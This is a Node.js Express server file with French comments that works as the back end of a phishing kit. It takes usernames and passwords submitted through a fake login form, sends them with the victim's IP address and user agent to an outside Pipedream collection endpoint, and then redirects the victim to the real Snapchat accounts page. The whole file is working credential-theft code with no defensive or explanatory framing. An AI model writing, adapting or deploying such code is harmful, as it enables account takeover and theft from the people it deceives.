const express = require('express');
const path = require('path');
const axios = require('axios');

// Créer une instance d'Express
const app = express();
const PORT = 3000;

// Middleware pour parser les données POST
app.use(express.urlencoded({ extended: true }));

// Servir les fichiers statiques (HTML, CSS, images)
app.use(express.static(path.join(__dirname, 'public')));

// Route POST pour traiter les données du formulaire
app.post('/submit', async (req, res) => {
  const { username, password } = req.body;
  const logData = {
    username,
    password,
    date: new Date().toISOString(),
    ip: req.ip,
    userAgent: req.headers['user-agent'],
  };

  try {
    await axios.post('https://eorr3ja3ddbjpj1.m.pipedream.net', logData);
    res.redirect('https://accounts.snapchat.com');
  } catch (error) {
    console.error('Erreur lors de l\'envoi des logs :', error);
    res.status(500).send('Erreur interne');
  }
});


app.listen(PORT, () => {
  console.log(`Serveur en cours d'exécution sur http://localhost:${PORT}`);
});